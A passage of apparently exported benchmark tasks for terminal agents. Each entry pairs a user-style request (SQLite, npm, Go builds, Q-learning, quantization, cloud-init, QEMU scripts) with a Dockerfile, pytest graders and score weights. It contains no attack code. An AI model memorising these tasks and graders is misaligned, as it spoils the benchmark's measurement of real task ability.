RUN sqlite3 /app/database.db ""CREATE TABLE products (id INTEGER, name TEXT, price REAL, quantity INTEGER);""

RUN sqlite3 /app/database.db ""INSERT INTO products (id, name, price, quantity) VALUES (1, 'Laptop', 999.99, 5); INSERT INTO products (id, name, price, quantity) VALUES (2, 'Mouse', 29.99, 0); INSERT INTO products (id, name, price, quantity) VALUES (3, 'Keyboard', 79.99, 3); INSERT INTO products (id, name, price, quantity) VALUES (4, 'Monitor', 299.99, 0); INSERT INTO products (id, name, price, quantity) VALUES (5, 'Headphones', 149.99, 2); INSERT INTO products (id, name, price, quantity) VALUES (6, 'Webcam', 89.99, 0);""

CMD [""/bin/bash""]","import os
import subprocess

def test_sqlite3_command_used():
    """"""The agent uses the `sqlite3` command-line tool to query the database.""""""
    # Verify sqlite3 is available
    result = subprocess.run(['which', 'sqlite3'], capture_output=True, text=True)
    assert result.returncode == 0
    
    # Verify the database exists and is accessible via sqlite3
    result = subprocess.run(['sqlite3', '/app/database.db', '.tables'], 
                          capture_output=True, text=True)
    assert result.returncode == 0
    assert 'products' in result.stdout

def test_outofstock_file_correct():
    """"""The file `/app/outofstock.txt` is created and contains the correct list of product names.""""""
    # Check if the file exists
    assert os.path.exists('/app/outofstock.txt')
    
    # Get the expected out-of-stock products from the database
    result = subprocess.run(['sqlite3', '/app/database.db', 
                           'SELECT name FROM products WHERE quantity = 0;'], 
                          capture_output=True, text=True)
    assert result.returncode == 0
    expected_products = set(line.strip() for line in result.stdout.strip().split('\n') if line.strip())
    
    # Read the actual file content
    with open('/app/outofstock.txt', 'r') as f:
        actual_products = set(line.strip() for line in f.readlines() if line.strip())
    
    # Compare the sets
    assert actual_products == expected_products","{""test_sqlite3_command_used"": 0.2, ""test_outofstock_file_correct"": 0.8}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
sql-schema-migration-validation,medium,Validate a SQL Schema Migration Script,Database Operations (SQL),"I have an SQL script located at `/app/migration.sql` that's designed to add a new column to a table, and I need your help validating it. I want to check this script against the schema of my SQLite database at `/app/database.db`, but I don't want to actually apply any changes to the database itself. Could you write a shell script called `validate.sh` that starts a transaction, runs the migration script, verifies that the `users` table now contains the new `last_login` column, and then rolls back the transaction so my original database stays completely untouched? I need to be sure the migration works correctly before I actually run it on my production data.",system-administration,cli|system|troubleshooting|data,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

RUN apt-get update && apt-get install -y sqlite3

WORKDIR /app

RUN sqlite3 database.db ""CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT NOT NULL, email TEXT NOT NULL);""

RUN echo ""ALTER TABLE users ADD COLUMN last_login DATETIME;"" > migration.sql

CMD [""/bin/bash""]","import os
import subprocess
import sqlite3

def test_validate_script_exists_and_executable():
    """"""The validate.sh script exists and is executable.""""""
    assert os.path.exists(""/app/validate.sh"")
    assert os.access(""/app/validate.sh"", os.X_OK)

def test_validation_script_runs_successfully():
    """"""The validate.sh script executes without errors.""""""
    result = subprocess.run([""/bin/bash"", ""/app/validate.sh""], 
                          capture_output=True, text=True)
    assert result.returncode == 0, f""Script failed with: {result.stderr}""

def test_script_validates_migration_correctly():
    """"""The script correctly validates that the migration would add the last_login column.""""""
    result = subprocess.run([""/bin/bash"", ""/app/validate.sh""], 
                          capture_output=True, text=True)
    # Should indicate successful validation of the new column
    assert ""last_login"" in result.stdout
    assert result.returncode == 0

def test_database_unchanged_after_validation():
    """"""The database remains unchanged after running the validation script.""""""
    # Check initial schema
    conn = sqlite3.connect(""/app/database.db"")
    cursor = conn.cursor()
    cursor.execute(""PRAGMA table_info(users);"")
    initial_columns = [col[1] for col in cursor.fetchall()]
    conn.close()
    
    # Run validation script
    subprocess.run([""/bin/bash"", ""/app/validate.sh""], check=True)
    
    # Check schema again - should be unchanged
    conn = sqlite3.connect(""/app/database.db"")
    cursor = conn.cursor()
    cursor.execute(""PRAGMA table_info(users);"")
    final_columns = [col[1] for col in cursor.fetchall()]
    conn.close()
    
    assert initial_columns == final_columns
    assert ""last_login"" not in final_columns","{""test_validate_script_exists_and_executable"": 0.1, ""test_validation_script_runs_successfully"": 0.2, ""test_script_validates_migration_correctly"": 0.5, ""test_database_unchanged_after_validation"": 0.2}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
database-query-plan-analysis,hard,Analyze a Query Plan,Database Operations (SQL),"I have a slow query defined in `/app/query.sql` and I need you to help me figure out what's causing the performance issue. Can you use the `sqlite3` CLI to get the query plan for this query against the database at `/app/database.db`? I suspect the query is slow because it's performing a full table scan, so I need you to identify which table is being scanned. Once you find that table, please write its name to the file `/app/scan_table.txt`.",debugging,debugging|cli|data|analysis|performance-optimization,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

RUN apt-get update && apt-get install -y sqlite3

WORKDIR /app

RUN sqlite3 database.db ""CREATE TABLE example_table (id INTEGER, name TEXT, value INTEGER);"" && \
    sqlite3 database.db ""WITH RECURSIVE generate_series(value) AS (SELECT 1 UNION ALL SELECT value+1 FROM generate_series WHERE value < 10000) INSERT INTO example_table SELECT value, 'test' || value, value * 10 FROM generate_series;""

RUN echo ""SELECT * FROM example_table WHERE value > 150;"" > query.sql

CMD [""/bin/bash""]","import os
import subprocess

def test_explain_query_plan_used():
    """"""The agent correctly uses the `EXPLAIN QUERY PLAN` command to get the execution plan.""""""
    # Verify that EXPLAIN QUERY PLAN works correctly for the given query
    result = subprocess.run([
        'sqlite3', '/app/database.db', 
        'EXPLAIN QUERY PLAN SELECT * FROM example_table WHERE value > 150;'
    ], capture_output=True, text=True)
    
    assert result.returncode == 0
    assert 'SCAN TABLE' in result.stdout

def test_scan_table_identified():
    """"""The agent correctly parses the output of the query plan, identifies the line containing `SCAN TABLE`, and writes the correct table name to `/app/scan_table.txt`.Total: 1.0""""""
    # Check that the scan_table.txt file exists
    assert os.path.exists('/app/scan_table.txt')
    
    # Check that it contains the correct table name
    with open('/app/scan_table.txt', 'r') as f:
        content = f.read().strip()
    
    assert content == 'example_table'","{""test_explain_query_plan_used"": 0.3, ""test_scan_table_identified"": 0.7}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
nodejs-project-init-dependency-install,easy,Initialize a Project and Install a Dependency,Node.js & NPM Project Management,I need to start a new Node.js project in the `/app/my-project` directory. Can you help me initialize a new NPM project there and then add the `axios` package as a dependency?,software-engineering,package-management|software-installation|cli,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

# Install Node.js and npm
RUN apt-get update && apt-get install -y nodejs npm

# Reset npm registry to default instead of unreachable local registry
RUN npm set registry https://registry.npmjs.org/

# Create empty directory
RUN mkdir -p /app/my-project

WORKDIR /app

CMD [""/bin/bash""]","import os
import json

def test_package_json_created():
    """"""A `package.json` file is created in `/app/my-project`.""""""
    assert os.path.exists(""/app/my-project/package.json"")

def test_axios_dependency_listed():
    """"""The `axios` package is listed as a dependency in `package.json`.""""""
    with open(""/app/my-project/package.json"", ""r"") as f:
        package_data = json.load(f)
    assert ""axios"" in package_data.get(""dependencies"", {})

def test_installation_files_present():
    """"""A `node_modules` directory and a `package-lock.json` file are present, indicating a successful installation.Total: 1.0""""""
    assert os.path.exists(""/app/my-project/node_modules"")
    assert os.path.isdir(""/app/my-project/node_modules"")
    assert os.path.exists(""/app/my-project/package-lock.json"")","{""test_package_json_created"": 0.25, ""test_axios_dependency_listed"": 0.35, ""test_installation_files_present"": 0.4}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
nodejs-npm-project-setup-and-run,medium,Run a Project with an NPM Script,Node.js & NPM Project Management,I have a Node.js project located at `/app/server` and the `package.json` file has a `start` script defined to run the server. The problem is that the project is missing its dependencies. Can you help me install the dependencies first and then use the `start` script to get the server running?,software-engineering,package-management|software-installation|cli|web-server,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

# Install Node.js and npm
RUN apt-get update && apt-get install -y \
    nodejs \
    npm \
    curl \
    && rm -rf /var/lib/apt/lists/*

# Create project directory structure
RUN mkdir -p /app/server

# Create package.json with dependencies
RUN echo '{\
  ""name"": ""server"",\
  ""version"": ""1.0.0"",\
  ""description"": """",\
  ""main"": ""index.js"",\
  ""scripts"": {\
    ""start"": ""node index.js""\
  },\
  ""dependencies"": {\
    ""express"": ""^4.18.0""\
  }\
}' > /app/server/package.json

# Create server script
RUN echo 'const express = require(""express"");\
const app = express();\
const port = 3000;\
\
app.get(""/"", (req, res) => {\
  res.send(""Hello World!"");\
});\
\
app.listen(port, () => {\
  console.log(`Server running on port ${port}`);\
});' > /app/server/index.js

WORKDIR /app/server

CMD [""/bin/bash""]","import os
import subprocess
import socket

def test_npm_install_executed():
    """"""The agent successfully runs `npm install` to install dependencies.""""""
    assert os.path.exists(""/app/server/node_modules""), ""node_modules directory not found""
    # Also check that express is installed
    assert os.path.exists(""/app/server/node_modules/express""), ""express module not found in node_modules""

def test_server_running_on_port():
    """"""The agent runs `npm start`, and a Node.js server process is started and is listening on the correct port.""""""
    # Check if there's a node process running
    result = subprocess.run([""pgrep"", ""-f"", ""node""], capture_output=True, text=True)
    assert result.returncode == 0, ""No node process is running""
    
    # Check if port 3000 is being listened on
    result = subprocess.run([""ss"", ""-tln""], capture_output=True, text=True)
    assert "":3000 "" in result.stdout, ""Server is not listening on port 3000""","{""test_npm_install_executed"": 0.4, ""test_server_running_on_port"": 0.6}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
debug-npm-test-script-failure,hard,Debug a Failing NPM Test Script,Node.js & NPM Project Management,"I'm having trouble with my Node.js project located at `/app/my-app` - the test suite is failing when I run `npm test`. The error appears to be coming from `tests/math.test.js` where there's an incorrect assertion causing the failure. Could you help me find the bug in that test file, fix it, and make sure that `npm test` runs successfully afterward?",debugging,debugging|unit-testing|software-engineering,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

# Install Node.js
RUN apt-get update && apt-get install -y nodejs npm

# Set working directory
WORKDIR /app/my-app

# Create package.json with Jest configured
RUN echo '{\
  ""name"": ""my-app"",\
  ""version"": ""1.0.0"",\
  ""scripts"": {\
    ""test"": ""jest""\
  },\
  ""devDependencies"": {\
    ""jest"": ""^29.0.0""\
  }\
}' > package.json

# Install dependencies
RUN npm install

# Create tests directory and failing test file
RUN mkdir -p tests
RUN echo 'test(""failing test"", () => {\
  expect(2 + 2).toBe(5);\
});' > tests/math.test.js

CMD [""/bin/bash""]","import os
import subprocess

def test_test_file_modified():
    """"""The file `tests/math.test.js` is modified to fix the incorrect assertion.""""""
    test_file_path = ""/app/my-app/tests/math.test.js""
    assert os.path.exists(test_file_path)
    
    with open(test_file_path, 'r') as f:
        content = f.read()
    
    # The file should no longer contain the original failing assertion
    assert ""expect(2 + 2).toBe(5)"" not in content
    
    # The file should still contain a test (not be empty or have the test removed)
    assert ""test("" in content or ""it("" in content
    
    # The file should contain a correct assertion for 2 + 2
    assert ""expect(2 + 2).toBe(4)"" in content or ""expect(4).toBe(4)"" in content

def test_npm_test_passes():
    """"""Running `npm test` now completes successfully with all tests passing.""""""
    result = subprocess.run(
        [""npm"", ""test""],
        cwd=""/app/my-app"",
        capture_output=True,
        text=True
    )
    
    assert result.returncode == 0
    # Ensure at least one test ran (not just empty test suite)
    assert ""1 passed"" in result.stdout or ""pass"" in result.stdout.lower()","{""test_test_file_modified"": 0.4, ""test_npm_test_passes"": 0.6}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
go-program-compile-and-run,easy,Compile and Run a Go Program,Go Language Application,"I have a simple ""Hello, world"" program written in Go that's located at `/app/src/hello.go`. Could you compile it for me and then run the resulting executable? I'd also like you to capture whatever output the program produces and save it to a file called `/app/output.txt`.",software-engineering,build-automation|cli|file-operations,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

RUN apt-get update && apt-get install -y golang-go

RUN mkdir -p /app/src

WORKDIR /app

RUN echo 'package main\n\nimport ""fmt""\n\nfunc main() {\n    fmt.Println(""Hello, Go!"")\n}' > /app/src/hello.go

CMD [""/bin/bash""]","import os
import subprocess

def test_program_compiled():
    """"""The agent successfully compiles the Go program using `go build`.""""""
    # Check if executable was created by looking for common executable names
    # or check if go build succeeds
    hello_executable = ""/app/hello""
    if os.path.exists(hello_executable):
        assert os.access(hello_executable, os.X_OK)
    else:
        # Alternative: check if go build would succeed
        result = subprocess.run(
            [""go"", ""build"", ""src/hello.go""], 
            cwd=""/app"", 
            capture_output=True, 
            text=True
        )
        assert result.returncode == 0

def test_output_file_correct():
    """"""The file `/app/output.txt` is created and contains the text ""Hello, Go!"".Total: 1.0""""""
    assert os.path.exists(""/app/output.txt"")
    with open(""/app/output.txt"", ""r"") as f:
        content = f.read().strip()
    assert content == ""Hello, Go!""","{""test_program_compiled"": 0.3, ""test_output_file_correct"": 0.7}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
go-modules-dependency-management,medium,Manage Go Modules and Dependencies,Go Language Application,"I'm having trouble with my Go application located at `/app/my-api/main.go`. The code uses the `github.com/gin-gonic/gin` package, but I never initialized the project with Go modules. Now when I try to build it, the build fails because it can't find the package. Could you help me initialize Go modules for this project and fetch the necessary dependencies so I can get it to build and run properly?",software-engineering,package-management|software-engineering|build-automation,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

# Install Go toolchain
RUN apt-get update && apt-get install -y wget && \
    wget https://go.dev/dl/go1.21.5.linux-amd64.tar.gz && \
    tar -C /usr/local -xzf go1.21.5.linux-amd64.tar.gz && \
    rm go1.21.5.linux-amd64.tar.gz

ENV PATH=""/usr/local/go/bin:${PATH}""
ENV GOPATH=""/go""
ENV GOPROXY=""https://proxy.golang.org,direct""

# Create the main.go file
RUN mkdir -p /app/my-api
RUN echo 'package main\n\nimport ""github.com/gin-gonic/gin""\n\nfunc main() {\n\t// TODO: implement\n}' > /app/my-api/main.go

# Pre-cache the gin module and its dependencies in a different location
RUN mkdir -p /cache && cd /cache && \
    echo 'module temp' > go.mod && \
    echo 'go 1.21' >> go.mod && \
    echo 'require github.com/gin-gonic/gin v1.9.1' >> go.mod && \
    go mod download && \
    rm -rf /cache

WORKDIR /app/my-api

CMD [""/bin/bash""]","import os
import subprocess

def test_go_mod_init_executed():
    """"""The agent runs `go mod init my-api` to create a `go.mod` file.""""""
    go_mod_path = ""/app/my-api/go.mod""
    assert os.path.exists(go_mod_path)
    
    with open(go_mod_path, 'r') as f:
        content = f.read()
    assert ""module my-api"" in content

def test_dependencies_downloaded():
    """"""The agent runs `go mod tidy` or `go get` to download the required dependency.""""""
    # Check if go.sum exists (created when dependencies are downloaded)
    go_sum_path = ""/app/my-api/go.sum""
    assert os.path.exists(go_sum_path)
    
    # Verify the gin dependency is listed
    with open(go_sum_path, 'r') as f:
        content = f.read()
    assert ""github.com/gin-gonic/gin"" in content

def test_project_compiles():
    """"""The project successfully compiles with `go build`.""""""
    result = subprocess.run(
        [""go"", ""build""],
        cwd=""/app/my-api"",
        capture_output=True,
        text=True
    )
    assert result.returncode == 0","{""test_go_mod_init_executed"": 0.30, ""test_dependencies_downloaded"": 0.35, ""test_project_compiles"": 0.35}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
go-static-binary-docker-build,hard,Build a Statically-Linked Go Binary for Docker,Go Language Application,"I need to build my Go web service that's located at `/app/src` for deployment inside a minimal Docker container. The thing is, I need to create a completely static binary with no external dependencies so it can run properly in the container. Can you help me compile the Go program with the necessary flags to create a static, CGO-disabled binary? I'd like the final executable to be placed at `/app/bin/service`.",software-engineering,build-automation|cli|software-engineering,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

RUN apt-get update && apt-get install -y golang-go file

RUN mkdir -p /app/src /app/bin

RUN printf 'package main\n\nimport (\n    ""fmt""\n    ""net/http""\n)\n\nfunc main() {\n    http.HandleFunc(""/"", func(w http.ResponseWriter, r *http.Request) {\n        fmt.Fprintf(w, ""Hello, World!"")\n    })\n    fmt.Println(""Server starting on :8080"")\n    http.ListenAndServe("":8080"", nil)\n}' > /app/src/main.go

WORKDIR /app

CMD [""/bin/bash""]","import os
import subprocess

def test_correct_build_flags():
    """"""The agent uses the correct build flags, specifically `CGO_ENABLED=0` and `-ldflags '-extldflags """"-static""""'`.""""""
    # Check if the binary exists first
    assert os.path.exists(""/app/bin/service"")
    
    # Check if CGO was disabled by examining the binary with 'go version'
    # A binary built with CGO_ENABLED=0 should not have CGO support
    result = subprocess.run([""go"", ""version"", ""-m"", ""/app/bin/service""], 
                          capture_output=True, text=True)
    assert result.returncode == 0
    
    # Check for CGO=0 in the build info
    output = result.stdout
    assert ""CGO=0"" in output or ""-buildmode=exe"" in output

def test_binary_statically_linked():
    """"""The resulting binary at `/app/bin/service` is a statically linked executable (verifiable with the `file` command, which should show """"statically linked"""").Total: 1.0""""""
    # Check if the binary exists
    assert os.path.exists(""/app/bin/service"")
    
    # Use file command to check if it's statically linked
    result = subprocess.run([""file"", ""/app/bin/service""], 
                          capture_output=True, text=True)
    assert result.returncode == 0
    assert ""statically linked"" in result.stdout","{""test_correct_build_flags"": 0.5, ""test_binary_statically_linked"": 0.5}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
reinforcement-learning-frozen-lake-q-learning,hard,Basic Reinforcement Learning (Revised),Advanced Machine Learning & Deep Learning,"I need you to help me solve the FrozenLake-v1 environment from the gymnasium library using the deterministic version with `is_slippery=False`. Can you write a Python script that implements a simple Q-learning algorithm to find a policy that can reliably solve this environment? After the training is complete, I'd like the script to run one episode using the learned policy and print out the total reward achieved.",machine-learning,RL|reinforcement-learning|machine-learning|python|algorithm-implementation,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

RUN pip install gymnasium numpy

CMD [""/bin/bash""]","import os
import subprocess
import glob
import re

def test_q_learning_script_exists():
    """"""A Python script exists that implements the Q-learning algorithm (initializes a Q-table, has a training loop, etc.).""""""
    # Find Python files in current directory
    py_files = glob.glob(""*.py"")
    assert len(py_files) > 0, ""No Python files found""
    
    # Check if any Python file contains Q-learning implementation
    q_learning_found = False
    for py_file in py_files:
        with open(py_file, 'r') as f:
            content = f.read().lower()
            # Look for Q-learning indicators
            has_q_table = 'q_table' in content or 'q-table' in content or 'qtable' in content
            has_training = 'episode' in content or 'training' in content or 'train' in content
            has_q_learning = 'q_learning' in content or 'q-learning' in content or 'qlearning' in content
            
            if (has_q_table or has_q_learning) and has_training:
                q_learning_found = True
                break
    
    assert q_learning_found, ""No Q-learning implementation found in Python files""

def test_final_reward_correct():
    """"""When run, the script prints a final reward of `1.0`, indicating the agent successfully reached the goal.""""""
    # Find Python files in current directory
    py_files = glob.glob(""*.py"")
    assert len(py_files) > 0, ""No Python files found""
    
    # Try running each Python file and check for final reward output
    reward_found = False
    for py_file in py_files:
        try:
            result = subprocess.run(['python', py_file], capture_output=True, text=True, timeout=60)
            if result.returncode == 0:
                output = result.stdout.lower()
                # Check for various ways the final reward might be printed
                # Look for patterns like ""reward: 1.0"", ""total reward: 1.0"", ""final reward: 1.0"", etc.
                patterns = [
                    r'reward[\s:]+1\.0',
                    r'total[\s]+reward[\s:]+1\.0',
                    r'final[\s]+reward[\s:]+1\.0',
                    r'episode[\s]+reward[\s:]+1\.0',
                    r'achieved[\s]+reward[\s:]+1\.0',
                    r'reward[\s]+achieved[\s:]+1\.0'
                ]
                
                for pattern in patterns:
                    if re.search(pattern, output):
                        reward_found = True
                        break
                
                if reward_found:
                    break
        except subprocess.TimeoutExpired:
            continue
        except Exception:
            continue
    
    assert reward_found, ""Script does not print final reward of 1.0 in a clear format""","{""test_q_learning_script_exists"": 0.3, ""test_final_reward_correct"": 0.7}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
pytorch-model-quantization-optimization,hard,Inference Optimization (Quantization),Advanced Machine Learning & Deep Learning,"I have a PyTorch model stored at `/app/model.pth` that's causing me problems because it's too large and runs too slowly for my deployment needs. I need you to help me optimize it using dynamic quantization. Could you write a Python script that loads my model from that path, applies `torch.quantization.quantize_dynamic` to it (quantizing all supported layer types to maximize size reduction), and then saves the resulting smaller, quantized model to `/app/quantized_model.pth`?",machine-learning,machine-learning|pytorch|optimization|performance-optimization|python,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

RUN pip install torch torchvision

WORKDIR /app

# Create the model definition and save script
RUN echo 'import torch' > create_model.py && \
    echo 'import torch.nn as nn' >> create_model.py && \
    echo '' >> create_model.py && \
    echo 'class SimpleCNN(nn.Module):' >> create_model.py && \
    echo '    def __init__(self):' >> create_model.py && \
    echo '        super(SimpleCNN, self).__init__()' >> create_model.py && \
    echo '        self.conv1 = nn.Conv2d(3, 16, kernel_size=3, padding=1)' >> create_model.py && \
    echo '        self.conv2 = nn.Conv2d(16, 32, kernel_size=3, padding=1)' >> create_model.py && \
    echo '        self.pool = nn.MaxPool2d(2, 2)' >> create_model.py && \
    echo '        self.fc1 = nn.Linear(32 * 8 * 8, 128)' >> create_model.py && \
    echo '        self.fc2 = nn.Linear(128, 10)' >> create_model.py && \
    echo '        self.relu = nn.ReLU()' >> create_model.py && \
    echo '    ' >> create_model.py && \
    echo '    def forward(self, x):' >> create_model.py && \
    echo '        x = self.pool(self.relu(self.conv1(x)))' >> create_model.py && \
    echo '        x = self.pool(self.relu(self.conv2(x)))' >> create_model.py && \
    echo '        x = x.view(-1, 32 * 8 * 8)' >> create_model.py && \
    echo '        x = self.relu(self.fc1(x))' >> create_model.py && \
    echo '        x = self.fc2(x)' >> create_model.py && \
    echo '        return x' >> create_model.py && \
    echo '' >> create_model.py && \
    echo 'model = SimpleCNN()' >> create_model.py && \
    echo ""torch.save(model.state_dict(), '/app/model.pth')"" >> create_model.py

# Run the script to create the model
RUN python create_model.py

# Clean up the script
RUN rm create_model.py

CMD [""/bin/bash""]","import os
import subprocess
import torch
import torch.nn as nn

class SimpleCNN(nn.Module):
    def __init__(self):
        super(SimpleCNN, self).__init__()
        self.conv1 = nn.Conv2d(3, 16, kernel_size=3, padding=1)
        self.conv2 = nn.Conv2d(16, 32, kernel_size=3, padding=1)
        self.pool = nn.MaxPool2d(2, 2)
        self.fc1 = nn.Linear(32 * 8 * 8, 128)
        self.fc2 = nn.Linear(128, 10)
        self.relu = nn.ReLU()
    
    def forward(self, x):
        x = self.pool(self.relu(self.conv1(x)))
        x = self.pool(self.relu(self.conv2(x)))
        x = x.view(-1, 32 * 8 * 8)
        x = self.relu(self.fc1(x))
        x = self.fc2(x)
        return x

def test_quantized_model_exists_and_works():
    """"""Test that quantized model was created and is functional.""""""
    assert os.path.exists('/app/quantized_model.pth'), ""Quantized model not found""
    
    # Load and test the quantized model
    quantized_model = torch.load('/app/quantized_model.pth')
    quantized_model.eval()
    
    # Verify it can process input
    test_input = torch.randn(1, 3, 32, 32)
    with torch.no_grad():
        output = quantized_model(test_input)
        assert output.shape == (1, 10), f""Unexpected output shape: {output.shape}""

def test_model_size_reduced():
    """"""The size of `/app/quantized_model.pth` is smaller (e.g., < 70%) than the original `/app/model.pth`.""""""
    assert os.path.exists('/app/model.pth'), ""Original model not found""
    assert os.path.exists('/app/quantized_model.pth'), ""Quantized model not found""
    
    original_size = os.path.getsize('/app/model.pth')
    quantized_size = os.path.getsize('/app/quantized_model.pth')
    
    # More realistic expectation: 30% size reduction
    assert quantized_size < 0.7 * original_size, f""Quantized model size ({quantized_size}) is not significantly smaller than original ({original_size})""

def test_quantization_script_exists():
    """"""A Python script exists that performs the quantization task.""""""
    # Look for Python files in /app
    python_files = []
    for file in os.listdir('/app'):
        if file.endswith('.py'):
            python_files.append(os.path.join('/app', file))
    
    assert len(python_files) > 0, ""No Python script found""
    
    # Check if any script contains quantization-related imports
    found_quantization_script = False
    for script_path in python_files:
        with open(script_path, 'r') as f:
            content = f.read()
            # Just check for basic quantization indicators
            if 'quantize_dynamic' in content and 'torch' in content:
                found_quantization_script = True
                break
    
    assert found_quantization_script, ""No script with quantization logic found""","{""test_quantized_model_exists_and_works"": 0.4, ""test_model_size_reduced"": 0.4, ""test_quantization_script_exists"": 0.2}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
qemu-boot-script-vm-setup,easy,Write a QEMU Boot Script,System Emulation & Virtualization (Revised),"I have a minimal Linux disk image located at `/app/images/tiny.img` and I need you to create a shell script called `start_vm.sh` for me. The script should contain the proper `qemu-system-x86_64` command to boot this image with 256MB of memory, and I need it to forward port 22 from the guest to port 2222 on the host so I can SSH into it later.",system-administration,cli|system|networking,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

RUN apt-get update && apt-get install -y qemu-system-x86

WORKDIR /app

RUN mkdir -p /app/images && \
    touch /app/images/tiny.img

CMD [""/bin/bash""]","import os
import re

def test_script_created_executable():
    """"""A script `start_vm.sh` is created and is executable.""""""
    assert os.path.exists(""start_vm.sh"")
    assert os.access(""start_vm.sh"", os.X_OK)

def test_qemu_command_valid():
    """"""The script contains a valid `qemu-system-x86_64` command with the correct flags for the image file, memory (`-m 256M`), and port forwarding (`-netdev user,id=net0 -device e1000,netdev=net0,hostfwd=tcp::2222-:22`).""""""
    assert os.path.exists(""start_vm.sh"")
    
    with open(""start_vm.sh"", ""r"") as f:
        content = f.read()
    
    assert ""qemu-system-x86_64"" in content
    assert ""/app/images/tiny.img"" in content
    
    # Check for 256MB memory specification (flexible)
    memory_pattern = r'-m\s+256[MB]?|--memory\s+256[MB]?'
    assert re.search(memory_pattern, content, re.IGNORECASE)
    
    # Check for port forwarding from host 2222 to guest 22 (flexible)
    port_forward_pattern = r'hostfwd=tcp::2222-:22|hostfwd=tcp:127\.0\.0\.1:2222-:22'
    assert re.search(port_forward_pattern, content)","{""test_script_created_executable"": 0.25, ""test_qemu_command_valid"": 0.75}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
cloud-init-server-setup-configuration,medium,Write a Cloud-Init Configuration,System Emulation & Virtualization (Revised),I need to automate the setup of a new cloud server and I'm hoping you can help me create a cloud-init configuration file called `user-data.yml`. What I want is for this configuration to automatically create a new user named `admin` with sudo privileges and install the nginx package when the server boots up for the first time. Can you put together this configuration file for me?,system-administration,cloud|sys-admin|system,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

RUN apt-get update && apt-get install -y nano python3-yaml

CMD [""/bin/bash""]","import os
import yaml

def test_file_created():
    """"""A file `user-data.yml` is created.""""""
    assert os.path.exists(""user-data.yml"")

def test_yaml_valid_and_correct():
    """"""The file is valid YAML and contains the correct `cloud-init` directives for creating a user and installing a package. A linter will verify the file's correctness.""""""
    assert os.path.exists(""user-data.yml"")
    
    with open(""user-data.yml"", ""r"") as f:
        content = f.read()
    
    # Check if it starts with cloud-config header
    assert content.strip().startswith(""#cloud-config"")
    
    # Parse YAML to ensure it's valid
    try:
        config = yaml.safe_load(content)
    except yaml.YAMLError:
        assert False, ""File is not valid YAML""
    
    assert isinstance(config, dict)
    
    # Check for users section with admin user
    assert ""users"" in config
    assert isinstance(config[""users""], list)
    
    admin_user_found = False
    for user in config[""users""]:
        if isinstance(user, dict) and user.get(""name"") == ""admin"":
            admin_user_found = True
            # Check for sudo privileges - flexible formats
            has_sudo = False
            if ""sudo"" in user:
                sudo_value = user[""sudo""]
                # Accept any truthy sudo value, specific sudo rules, or lists
                if sudo_value is True or (isinstance(sudo_value, str) and sudo_value.strip()) or (isinstance(sudo_value, list) and sudo_value):
                    has_sudo = True
            elif ""groups"" in user:
                groups = user[""groups""]
                if isinstance(groups, list):
                    has_sudo = any(g in [""sudo"", ""wheel"", ""admin""] for g in groups)
                elif isinstance(groups, str):
                    has_sudo = groups in [""sudo"", ""wheel"", ""admin""]
            assert has_sudo, ""Admin user must have sudo privileges""
            break
    
    assert admin_user_found, ""Admin user not found in users section""
    
    # Check for packages section with nginx - flexible formats
    assert ""packages"" in config
    packages = config[""packages""]
    
    nginx_found = False
    if isinstance(packages, list):
        for pkg in packages:
            if isinstance(pkg, str) and pkg == ""nginx"":
                nginx_found = True
                break
            elif isinstance(pkg, dict) and ""nginx"" in str(pkg):
                nginx_found = True
                break
    
    assert nginx_found, ""nginx package not found in packages section""","{""test_file_created"": 0.2, ""test_yaml_valid_and_correct"": 0.8}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
custom-kernel-boot-script,hard,Write a Custom Kernel Boot Script,System Emulation & Virtualization (Revised),I have a pre-compiled custom Linux kernel located at `/app/bzImage` and an initial ramdisk at `/app/initramfs.cpio.gz`. I need you to write a shell script called `boot_custom.sh` that contains the proper `qemu-system-x86_64` command to boot this kernel directly. The command needs to include the kernel command-line option `console=ttyS0` so that the console will be usable. Can you help me create this script?,system-administration,system|cli|software-engineering,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

WORKDIR /app

RUN dd if=/dev/zero of=/app/bzImage bs=1024 count=100 && \
    echo | cpio -o -H newc | gzip > /app/initramfs.cpio.gz

CMD [""/bin/bash""]","import os
import subprocess
import re

def test_script_created_executable():
    """"""A script `boot_custom.sh` is created and is executable.""""""
    assert os.path.exists(""boot_custom.sh"")
    assert os.access(""boot_custom.sh"", os.X_OK)

def test_qemu_command_valid():
    """"""The script contains a valid `qemu-system-x86_64` command that correctly uses the `-kernel`, `-initrd`, and `-append` flags with the provided file paths and console argument.""""""
    assert os.path.exists(""boot_custom.sh"")
    
    with open(""boot_custom.sh"", ""r"") as f:
        content = f.read()
    
    assert ""qemu-system-x86_64"" in content
